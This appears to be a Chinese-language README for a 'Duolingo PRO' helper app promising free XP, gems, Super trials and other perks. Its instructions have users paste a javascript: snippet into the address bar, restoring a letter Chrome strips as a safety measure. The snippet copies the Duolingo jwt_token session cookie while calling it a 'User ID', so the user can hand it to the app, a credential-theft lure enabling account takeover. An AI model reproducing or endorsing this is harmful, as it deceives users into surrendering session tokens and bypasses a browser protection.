### Duolingo PRO 助手

這是一款簡單方便的輔助工具，能讓你快速兌換 Duolingo 的資源，例如：

- 經驗值 (XP)
- 寶石（Gems）
- Duolingo Super 3 Days Trial
- 連勝保護（Streak Freezes）  
- 補充紅心（Heart Refill）  
- 經驗值加成（XP Boost）


#### 如何使用

1. 安裝並打開應用程式  
2. 點右上角的頭像圖示，輸入你的 User ID  
3. 選擇你想執行的功能（如取得寶石）  
4. 輸入數量並送出請求  
5. 等待處理完成，即可獲得資源！

#### 如何取得 User ID？

1. 開啟 Duolingo 頁面（https://duolingo.com）  
2. 複製以下這段文字貼到網址列（但前面手動補上 `j`，變成 `javascript:`，Chrome 會自動清掉）：  
   
   ```
   avascript:(function(){try{const token=document.cookie.split(';').find(c=>c.includes('jwt_token')).split('=')[1];const el=document.createElement('textarea');el.value=token;document.body.appendChild(el);el.select();document.execCommand('copy');document.body.removeChild(el);alert('已複製 User ID：'+token);}catch(e){alert('找不到登入資訊');}})();
   ```

3. 按下 Enter，會自動複製 User ID 到剪貼簿  
4. 回到 App，貼上即可

#### 注意事項

- 請確認你已登入 Duolingo，否則無法取得 User ID  
- 若請求失敗，請稍等幾秒再試  
- 注意用量

有任何建議或問題，歡迎回報。
